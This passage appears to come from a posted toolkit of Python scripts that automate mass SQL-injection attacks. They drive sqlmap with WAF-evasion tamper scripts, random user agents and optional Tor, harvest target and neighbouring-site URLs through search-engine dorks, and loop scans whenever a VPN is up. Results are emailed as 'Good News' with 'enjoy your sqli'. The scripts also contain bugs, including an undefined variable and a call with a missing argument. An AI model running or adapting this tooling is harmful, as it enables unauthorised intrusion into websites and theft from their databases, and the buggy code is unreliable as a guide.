		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_https_url,origin_https_url)
		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_https_url,origin_https_url)
		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_https_url,origin_https_url)
		#print("sqlmap_string is:%s" % sqlmap_string)
		if tor_or_not==False:
			print("sqlmap_string is:%s" % sqlmap_string)
			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
			if post_or_not==True:
				os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
			
		elif tor_or_not==True:
			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
			if post_or_not==True:
				os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
	else:
		fp=open(origin_https_url_or_file,"r+")
		all_urls=fp.readlines()
		fp.close()
		for each in all_urls:
			origin_https_url=re.sub(r'(\s)',"",each)		
			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_https_url,origin_https_url)
			forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_https_url,origin_https_url)
			tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3''' % (origin_https_url,origin_https_url)
			tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms''' % (origin_https_url,origin_https_url)
			#print("sqlmap_string is %s" % sqlmap_string)
			if tor_or_not==False:
				print("sqlmap_string is:%s" % sqlmap_string)
				print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
				if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
			elif tor_or_not==True:
				print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
				print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
				if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)


def sqlmap_g_human(https_url_or_file,tor_or_not,post_or_not):
	#this function use myGoogleScraper to search google dork to get the full
	#urls,in this mode,we need input the yanchengma by human,not robot,coz 
	#sqlmap's -g option can only get the former 100 results,this function will
	#get almost the all results.
	if re.match("(https://)|(https://)",https_url_or_file):
		domain_url=https_url_or_file[7:] if re.match("(https://)",url_or_file) else https_url_or_file[8:]
		query='''site:%s inurl:php|asp|aspx|jsp''' % domain_url
		#import easy_search
		#search_url_list=blew expression
		#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_https_domain_url_list")
		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
		#print("sqlmap_string is:%s" % sqlmap_string)
		if tor_or_not==False:
			print("sqlmap_string is:%s" % sqlmap_string)
			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % sqlmap_string)
			if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
		elif tor_or_not==True:
			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
			os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
			if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
	else:
		#print(666666661111111)
		try:
			fp=open(https_url_or_file,"r+")
			all_urls=fp.readlines()
			#print("open file 666666")
			print(55555)
			print(all_urls)
			fp.close()
			for each in all_urls:
				domain_url=each[7:] if re.match("(https://)",each) else each[8:]
				print(6666)
				print(domain_url)
				query='''site:%s inurl:php|asp|aspx|jsp''' % domain_url
				#import easy_search
				#search_url_list=blew expression
				#easy_search.myGoogleScraper_get_urls_from_query(query,"GoogleScraper_origin_https_domain_url_list")
				os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % query)#here myenv/python3.5 is the selenium changed version
			sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
			forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
			tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
			tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
			#print("sqlmap_string is:%s" % sqlmap_string)
			if tor_or_not==False:
				print("sqlmap_string is:%s" % sqlmap_string)
				print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
				os.system("/usr/bin/python2.7 %s" % sqlmap_string)
				if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
			elif tor_or_not==True:
				print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
				print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
				os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
				if post_or_not==True:
					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
		except:
			print("open file error")
		

def main():
	sqlmap_g_human("targets.txt",False)
if __name__ == '__main__':
	main()
```

5>MyToolKit.py

```python
#works in py3,coz mysqlmap module need py3
#works in py2 with selenium not changed best,coz
#the mysqlmap module will use os.system function 
#to use the selenium changed version itself
#so here with py3 while selenium changed version or
#selenium not changed version is both ok.
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#works in py3,coz mysqlmap module need py3
#works in py2 with selenium not changed best,coz
#the mysqlmap module will use os.system function 
#to use the selenium changed version itself
#so here with py3 while selenium changed version or
#selenium not changed version is both ok.
#
#/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
import os
import re 
import mysqlmap
import time

#该函数功能:检测当前系统vpn是否开启
def checkvpn():
    import os
    import re
    #windows:-n 2
    #linux:-c 2
    a='ping www.google.com.hk -c 2'
    r=os.popen(a)
    output=r.readlines()
    #print output
    output="".join(output)
    p=re.compile(r'ttl=',re.I)
    if p.findall(output):
        #print "ok"
        return 1
    else:
        return 0



while(True):	
	print('''do you want use 'tor' service in your sqli action? sometimes when your network is not very well,
is not a good idea to use tor,but when your targets has waf,use tor is better.
input Y(y) or N(n) default [Y]:>''',end='')
	choose_tor=input()
	if choose_tor=='N' or choose_tor=='n':
		bool_tor=False
	else:
		bool_tor=True


	print('''do you want use 'post' request in your sqli scan? sometimes when you want a faster speed,
use 'get' request is enough,do no need to use 'post' request,meanwhile,when there exists some waf,
use 'get' and 'post' will try too many times's request which will make the waf block you ip,so in these cases,do not use 'post' request,
but use only 'get' request without 'post' request,the number of sqli points will be less in the common sense,
input Y(y) or N(n) default [N]:>''',end='')
	choose_post=input()
	
	if choose_post=='Y' or choose_post=='y':
		post_or_not=True
	else:
		post_or_not=False
		
	os.system('''mv -f /root/.sqlmap/output/* /root/.sqlmap/output_bak''')

	print('''there are several functions blew,chose the number of the list you want the script to do:
1.for exp execution to the targets,your targets file should include the urls like "https://xxx.xxx.xxx/xx/" or "https://xxx.xxx.xxx/ etc."
2.for sqli by mygoogle to search the domains in one ip
3.for sqli by mybing to search the domains in one ip
4.for sqli by google search<that is more than easy_search.py's function,but like "easy_search.py | sqlmap -m">
5.sqli scan only url in targets.txt,without the urls's side domains(只扫targets.txt中的url,不扫旁站)
input your number here:>''',end='')
	num=int(input())
	if num==1:
		print("input your exp path here:>",end='')
		exp_path=input()
		print("input your targets path here:>",end='')
		targets=input()
		fp=open(targets,"r+")		
		list=fp.readlines()
		fp.close()
		for each in list:
			os.system('''python %s >> "out_log.txt"''' % exp_path)
		pass



	if num==2:
		print('''input your targets path here,the name has to be "targets.txt",
if your target file is not "targets.txt",you'd better change its file name to "targets.txt",
otherwise you need to change the source code :>''',end='')
		targets=input()
		print('''there are three kinds of sqli blew:
1.use "sqlmap_crawl" 
2.use "sqlmap-g-nohuman"
3.use "sqlmap-g-human
input your number here:''',end='')
		num=int(input())
		if num==1:
			while(1):
				if checkvpn():
					os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
					mysqlmap.sqlmap_craw("GoogleScraper_bing_origin_https_domain_url_list.txt",bool_tor,post_or_not)
					try:
						mysqlmap.sqlmap_craw("bing_origin_https_domain_url_list.txt",bool_tor,post_or_not)
					except:
						pass
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")



		if num==2:
			while(1):
				if checkvpn():
					os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
					mysqlmap.sqlmap_g_nohuman("GoogleScraper_bing_https_domain_list.txt",bool_tor,post_or_not)
					try:
						mysqlmap.sqlmap_g_nohuman("bing_https_domain_list.txt",bool_tor,post_or_not)	
					except:
						pass
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")




		if num==3:
			while(1):
				if checkvpn():
					print('''!!!attention:all firefox process will be kill after easy_search''',end='')
					os.system("/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f %s" % targets)
					print("1111111111111111111success here")
					mysqlmap.sqlmap_g_human("GoogleScraper_bing_https_domain_list.txt",bool_tor,post_or_not)
					print("2222222222222222222success here")
					try:
						mysqlmap.sqlmap_g_human("bing_https_domain_list.txt",bool_tor,post_or_not)
					except:
						pass
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")



		elif num!=1 and num!=2 and num!=3:
			print("choose number wrong")



	if num==3:
		print("input your targets path here:>",end='')
		targets=input()
		print('''there are three kinds of sqli blew:
1.use "sqlmap_crawl" 
2.use "sqlmap-g-nohuman"
3.use "sqlmap-g-human
input your number here:''',end='')
		num=int(input())
		if num==1:
			while(1):
				if checkvpn():
					os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
					print('''os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets) execute.''')
					mysqlmap.sqlmap_craw("bing_origin_https_domain_url_list.txt",bool_tor,post_or_not)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")

		if num==2:
			while(1):
				if checkvpn():
					os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
					print("/usr/bin/python2.7 my_bing_domains_v1_alone.py -f %s" % targets)
					print("8888888888888success here")
					mysqlmap.sqlmap_g_nohuman("bing_https_domain_list.txt",bool_tor,post_or_not)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")



		if num==3:
			while(1):
				if checkvpn():
					os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py %s" % targets)
					mysqlmap.sqlmap_g_human("bing_https_domain_list.txt",bool_tor,post_or_not)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")


		elif num!=1 and num!=2 and num!=3:
			print("choose number wrong")




	if num==4:
		print('''input your keyword you want google to search>''',end='')
		keyword=input()
		print('''!!!attention:all firefox process will be kill after easy_search''',end='')		
		os.system('''/root/myenv/bin/python3.5 easy_search.py "%s"''' % keyword)
		#mysqlmap.sqlmap_g_human("GoogleScraper_origin_https_domain_url_list.txt",bool_tor)
		#above is a wrong action to use sqlmap_g_human,coz there exist easy_search.py's 
		#function in mysqlmap.sqlmap_g_human(),then use below to make it good to work:
		


		sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
		forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
		tor_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3'''
		tor_forms_sqlmap_string='''/usr/share/sqlmap/sqlmap.py --tor --tor-type=socks5 --check-tor -m GoogleScraper_origin_https_domain_url_list.txt -v 4 --delay 2 --smart --batch --threads 4 --random-agent --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --forms'''
		#print("sqlmap_string is:%s" % sqlmap_string)
		if bool_tor==False:
			print("sqlmap_string is:%s" % sqlmap_string)
			print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
			while(1):
				if checkvpn():
					os.system("/usr/bin/python2.7 %s" % sqlmap_string)
					os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")

		elif bool_tor==True:
			print("tor_sqlmap_string is:%s" % tor_sqlmap_string)
			print("tor_forms_sqlmap_string is:%s" % tor_forms_sqlmap_string)
			while(1):
				if checkvpn():
					os.system("/usr/bin/python2.7 %s" % tor_sqlmap_string)
					os.system("/usr/bin/python2.7 %s" % tor_forms_sqlmap_string)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")


	if num==5:
		print('''attention!!!
once you choosed this function, make sure your "targets.txt" file has urls 
like:https://xxx.xxx..or https://xxx.xxx..,
but not xxx.xxx.xxx without url.scheme''')
		print("input your targets path here:>",end='')
		targets=input()
		print('''there are three kinds of sqli blew:
1.use "sqlmap_crawl" 
2.use "sqlmap-g-nohuman"
3.use "sqlmap-g-human
input your number here:''',end='')
		num=int(input())
		if num==1:
			while(1):
				if checkvpn():
					mysqlmap.sqlmap_craw("targets.txt",bool_tor,post_or_not)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")


		if num==2:
			while(1):
				if checkvpn():
					mysqlmap.sqlmap_g_nohuman("targets.txt",bool_tor,post_or_not)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")
			
		if num==3:
			while(1):
				if checkvpn():
					mysqlmap.sqlmap_g_human("targets.txt",bool_tor,post_or_not)
				else:
					time.sleep(1)
					print("vpn is off,scan will continue till vpn is on")
			
		elif num!=1 and num!=2 and num!=3:
			print("choose number wrong")

	os.system('/usr/bin/python2.7 mail.py')
	os.system('''mv -f /root/.sqlmap/output_bak/* /root/.sqlmap/output''')
```

6>mail.py

```python
# -*- coding: utf-8 -*-
# make sure your MyToolKit folder has only target file,and make its
# ext 'targets.txt',otherwise you should change the source code to make it 
# good to use.
# 
# #/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
# -*- coding: utf-8 -*-
# make sure your MyToolKit folder has only target file,and make its
# ext 'targets.txt',otherwise you should change the source code to make it 
# good to use.
# 
# #/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
#
import smtplib
from email.mime.text import MIMEText
from email.header import Header
import os
import re
import socket

#下面一行要设置成你自己的邮件服务器的地址以及用户名密码发件人信息



def sendMail(mailto,subject,body,format='plain'):

    #host,user,password,fromMail = smtpInfo
    host='xxxxxxxxxx'
    user='xxxxxxxxxx'
    password='xxxxxxxxxx'
    fromMail='xxxxxxxxxx'

    if isinstance(body,unicode) is True:
        body=str(body)
    me= ("%s<"+fromMail+">") % (Header('naruto','utf-8'),)
    msg = MIMEText(body,format,'utf-8')
    if not isinstance(subject,unicode):
        subject = unicode(subject)
    msg['Subject'] = subject
    msg['From'] = me
    msg['To'] = mailto
    msg["Accept-Language"]="zh-CN"
    msg["Accept-Charset"]="ISO-8859-1,utf-8"
    try:
        s = smtplib.SMTP()
        s.connect(host)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.set_debuglevel(3)
        s.login(user,password)
        s.sendmail(me, mailto, msg.as_string())
        s.quit()
        return True
    except Exception, e:
        print str(e)
        return False



def read_save_msg_from_csv(csv_file):
	f=open(csv_file,"r+")
	list=f.readlines()
	f.close()
	return_list=[]
	import re
	for each in list:
		matchobj=re.match(r'https',each)
		if matchobj:
			#print each
			each=re.sub(r'(\s)',"",each)
			return_list.append(each)      
        #print return_list
        return return_list
def get_result_from_folder(folder):	
	os.system("ls %s/*.csv > csv_file_list.txt" % folder)
	f=open("csv_file_list.txt","r+")
	list=f.readlines()
	f.close()
	os.system("rm csv_file_list.txt")
	final_list=[]
	for each in list:
		each=re.sub(r'(\s)',"",each)
		#print each
		list_from_single_file=read_save_msg_from_csv(each)
		if len(list_from_single_file)>0:
			final_list.append(list_from_single_file)
	#print final_list
	return final_list



def getIp(domain):    
    try:
    	myaddr=socket.getaddrinfo(domain,'https')[0][4][0]
    	return myaddr
    except:
    	pass

#all_nics_ip=socket.gethostbyname_ex(sharedHost)[2]



def get_source_domain_of_target_sqli_urls(url):
	import socket
	import re
	sqli_url_domain=re.sub(r'(https://)|(https://)|(\s)|(/.*)|(:.*)',"",url)
	#print sqli_url_domain

	f=open("targets.txt","r+")
	targets_list=f.readlines()
	f.close()
	all_list=[]
	for each in targets_list:
		each=re.sub(r'(https://)|(https://)|(\s)|(/.*)|(:.*)',"",each)
		domain=[]
		domain.append(each)
		try:
			all_nics_ip=socket.gethostbyname_ex(each)[2]
			each_list=all_nics_ip+domain
			all_list.append(each_list)
		except:
			pass
	#print all_list
	for single_list in all_list:
		try:			
			sqli_url_ip=socket.gethostbyname_ex(sqli_url_domain)[2]
			#print sqli_url_ip
			#print 55555555
			#print single_list
			if sqli_url_ip[0] in single_list:				
				#print 66666666
				#print single_list[-1]
				return single_list[-1]	
		except:
			pass
		

def get_msg_to_send():
	msg_list=get_result_from_folder("/root/.sqlmap/output")                
	msg_to_send="Good News!!! below are the results of sqli output:\r\n-----------------------------------------------------------------------------\r\n"
	for each in msg_list:
		for one in each:
			main_target_domain=get_source_domain_of_target_sqli_urls(one)
			msg_to_send+=(one+'\r\n')
			msg_to_send+='---->>>>>this domain belongs to the main target domain:>>>%s<<<---\r\n' % main_target_domain
			msg_to_send+='-----------------------------------------------------------------------------\r\n'		
	msg_to_send+='enjoy your sqli:D'
	return msg_to_send

def main():
	msg=get_msg_to_send()
	print 66666666666666666666666666666666666
	sendMail('xxxxxxxxxx','xxxxxxxxxx',msg)
	sendMail('xxxxxxxxxx','xxxxxxxxxx',msg)
	sendMail('xxxxxxxxxx','xxxxxxxxxx',msg)


if __name__ == '__main__':
	main()
```






